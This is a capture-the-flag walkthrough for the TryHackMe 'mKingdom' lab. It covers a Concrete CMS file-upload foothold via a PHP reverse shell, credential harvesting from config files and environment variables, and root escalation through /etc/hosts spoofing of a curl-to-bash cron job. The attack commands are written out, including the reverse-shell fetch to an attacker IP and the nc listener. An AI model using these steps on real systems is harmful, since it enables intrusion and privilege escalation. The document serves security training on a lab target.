---
tags:
  - THM
  - Linux
  - Easy
  - CMS
  - File-Upload
  - RCE
  - Leakage
  - Cron
  - Scripting
  - DNS-Spoof
  - Security-SW
---
https://tryhackme.com/room/mkingdom/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.107.31 mkingdom.thm
```
# Scanning
```console
$ nmap -p85 -sV -sC mkingdom.thm

PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN
```
# Enumeration
Found http://mkingdom.thm:85/app/ directory:
```console
$ gobuster dir -q -u http://mkingdom.thm:85 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

/app                  (Status: 301) [Size: 312] [--> http://mkingdom.thm:85/app/]
```
Found [RCE vulnerability](https://hackerone.com/reports/768322) in **Concrete CMS** version 8.5.2:
```console
$ whatweb http://mkingdom.thm:85/app/castle/
http://mkingdom.thm:85/app/castle/ [200 OK] Apache[2.4.7], Bootstrap, Concrete5[8.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.107.31], JQuery, MetaGenerator[concrete5 - 8.5.2], PHP[5.5.9-1ubuntu4.29], Script[text/javascript], Title[Home :: toad], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.5.9-1ubuntu4.29], X-UA-Compatible[IE=edge]
```
# Exploitation
Successful [login](http://mkingdom.thm:85/app/castle/index.php/login) with **common credentials** `admin` and `password`. Navigate to [System & Settings > Allowed File Types](http://mkingdom.thm:85/app/castle/index.php/dashboard/system/files/filetypes) and whitelist `php` file extension for uploads.

Download PHP reverse shell file as `rev.php`:
```bash
curl -s -o rev.php 'https://www.revshells.com/PHP%20PentestMonkey?ip=<ATTACKER-IP>&port=<PORT>&shell=bash'
```
Upload `rev.php` at [Files > File Manager](http://mkingdom.thm:85/app/castle/index.php/dashboard/files/search) and wait for connections:
```bash
nc -lvnp <PORT>
```
Get reverse shell connection by running `rev.php`:
```bash
curl -s 'http://mkingdom.thm:85/app/castle/application/files/<FILEPATH>/rev.php'
```
# Post-Exploitation
## User Migration
Found **user mario** and **user toad**:
```console
$ grep sh$ /etc/passwd

root:x:0:0:root:/root:/bin/bash
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
mario:x:1001:1001:,,,:/home/mario:/bin/bash
toad:x:1002:1002:,,,:/home/toad:/bin/bash
```
Found **password** of **user toad**:
```console
$ cat /var/www/html/app/castle/application/config/database.php

<?php

return [
    'default-connection' => 'concrete',
    'connections' => [
        'concrete' => [
            'driver' => 'c5_pdo_mysql',
            'server' => 'localhost',
            'database' => 'mKingdom',
            'username' => 'toad',
            'password' => 'toadisthebest',
            'character_set' => 'utf8',
            'collation' => 'utf8_unicode_ci',
        ],
    ],
];
```
Migrated to **user toad** and found **base64 encoded password** of **user mario** in **environment variables**:
```console
$ printenv | grep token
PWD_token=aWthVGVOVEFOdEVTCg==

$ base64 -d <<< aWthVGVOVEFOdEVTCg==
ikaTeNTANtES
```
Migrated to **user mario** and found **user flag**:
```console
$ su mario

$ cat /home/mario/user.txt
```
## Abusing Cron Job
Created `procmon.sh` for process monitoring:
```bash
#!/bin/bash

old_proc=$(ps -e -o pid,user,command)

while true; do
    new_proc=$(ps -e -o pid,user,command)
    diff <(echo "$old_proc") <(echo "$new_proc") | grep "[\>\<]" | grep -v -E "kworker|pid,user,command"
    old_proc=$new_proc
done
```
Found **cron job** `counter.sh` executed by root with a **DNS** reference:
```console
$ bash procmon.sh

> 16936 root     CRON
> 16937 root     /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log 
> 16940 root     bash
> 16944 root     bash
> 16945 root     ls -laR /var/www/html/app/castle/
> 16946 root     wc -l
```
The `/etc/hosts` file is writeable by **group mario**:
```console
$ ls -l /etc/hosts

-rw-rw-r-- 1 root mario 342 Jan 26  2024 /etc/hosts
```
Created malicious `counter.sh` script in the attacker's machine:
```console
$ mkdir -p /tmp/app/castle/application

$ echo 'chmod u+s /bin/bash' > /tmp/app/castle/application/counter.sh
```
Setup malicious Python server in the attacker's machine:
```console
$ cd /tmp

$ sudo python3 -m http.server 85
```

Modified the victim's `/etc/hosts` file to redirect requests to the attacker's machine when the **cron job** gets executed:
```text
<ATTACKER-IP> mkingdom.thm
```
Launch a **root** bash session after `/bin/bash` gets **SUID permissions**:
```bash
/bin/bash -p
```
Can not read **root flag** because **AppArmor** is enabled:
```console
# cat /root/root.txt
cat: root.txt: Permission denied

# aa-enabled
Yes
```
Read **root flag** using alternative commands:
```bash
head /root/root.txt
```